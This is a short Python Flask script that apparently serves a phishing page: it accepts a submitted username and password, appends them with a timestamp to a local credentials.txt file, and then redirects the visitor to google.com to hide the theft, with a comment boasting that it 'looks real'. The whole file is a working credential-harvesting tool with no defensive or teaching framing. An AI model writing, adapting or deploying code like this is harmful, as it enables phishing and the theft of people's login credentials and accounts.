from flask import Flask, request, redirect
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return open('index.html').read()

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    
    with open('credentials.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()} - Username: {username} | Password: {password}\n")
    
    return redirect("https://google.com")  # Looks real, doesn't it? 😏

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
